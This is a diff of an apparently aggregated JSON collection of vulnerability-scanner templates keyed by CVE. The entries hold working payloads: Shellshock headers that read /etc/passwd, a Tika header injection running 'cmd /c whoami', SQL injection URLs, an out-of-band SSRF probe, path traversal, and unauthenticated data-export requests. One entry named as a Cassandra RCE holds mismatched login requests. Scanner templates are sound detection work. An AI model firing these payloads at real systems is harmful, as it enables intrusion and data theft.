@@ -3296,9 +3296,9 @@
       "requests": [
         {
           "headers": {
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6234,11 +6234,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -8300,6 +8300,21 @@
       ]
     },
     {
+      "id": "CVE-2019-16996",
+      "info": {
+        "name": "Metinfo7.0 beta - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/admin/?n=product&c=product_admin&a=dopara&app_type=shop&id=1%20union%20SELECT%201,2,3,25367*75643,5,6,7%20limit%205,1%20%23"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-16997",
       "info": {
         "name": "Metinfo 7.0.0 beta SQLI",
@@ -9149,8 +9164,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -9980,7 +9995,7 @@
     {
       "id": "CVE-2020-15148",
       "info": {
-        "name": "Yii 2 <2.0.38 - Remote Code Execution",
+        "name": "Yii 2 < 2.0.38 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10472,6 +10487,21 @@
       ]
     },
     {
+      "id": "CVE-2020-22210",
+      "info": {
+        "name": "74cms Sql Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test\") and extractvalue(1,concat(0x7e,md5(1234567890))) -- a"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-22840",
       "info": {
         "name": "b2evolution CMS Open redirect",
@@ -10911,6 +10941,21 @@
         {
           "raw": [
             "POST /api/graphql HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"query\": \"{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\n    avatarUrl\\n    status {\\n      emoji\\n      message\\n      messageHtml\\n     }\\n    }\\n   }\\n  }\\n }\",\n  \"variables\": null,\n  \"operationName\": null\n}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-26876",
+      "info": {
+        "name": "WordPress WP Courses Plugin Information Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-json/wp/v2/lesson/1"
           ]
         }
       ]
@@ -14951,7 +14996,7 @@
         {
           "raw": [
             "GET /%u002e/WEB-INF/web.xml HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n",
-            "GET /.%00/WEB-INF/web.xml HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n\n"
+            "GET /.%00/WEB-INF/web.xml HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n"
           ]
         }
       ]
@@ -16237,6 +16282,21 @@
       ]
     },
     {
+      "id": "CVE-2021-44451",
+      "info": {
+        "name": "Apache Superset Default Login",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /login/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n",
+            "POST /login/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/admin/airflow/login\n\ncsrf_token={{csrf_token}}&username={{username}}&password={{password}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-44521",
       "info": {
         "name": "Apache Cassandra Load UDF RCE",
@@ -16244,13 +16304,9 @@
       },
       "requests": [
         {
-          "body": "sidefunc=update&syear=111'",
-          "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8"
-          },
-          "method": "POST",
-          "path": [
-            "{{BaseURL}}/Side.php"
+          "raw": [
+            "GET /login/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n",
+            "POST /login/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/admin/airflow/login\n\ncsrf_token={{csrf_token}}&username={{username}}&password={{password}}\n"
           ]
         }
       ]
@@ -16645,6 +16701,35 @@
       ]
     },
     {
+      "id": "CVE-2022-1020",
+      "info": {
+        "name": "Woo Product Table < 3.1.2 - Unauthenticated Arbitrary Function Call",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php?action=wpt_admin_update_notice_option HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\noption_key=a&perpose=update&callback=phpinfo\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-1054",
+      "info": {
+        "name": "RSVP and Event Management < 2.7.8 - Unauthenticated Entries Export",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin.php?page=rsvp-admin-export"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-21371",
       "info": {
         "name": "Oracle WebLogic Server Local File Inclusion",
@@ -17020,6 +17105,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/plugins/web/service/search/auto-completion/domain/en.xml?q=adm"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-27849",
+      "info": {
+        "name": "WordPress Simple Ajax Chat plugin <= 20220115 - Sensitive Information Disclosure vulnerability",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/simple-ajax-chat/sac-export.csv"
           ]
         }
       ]
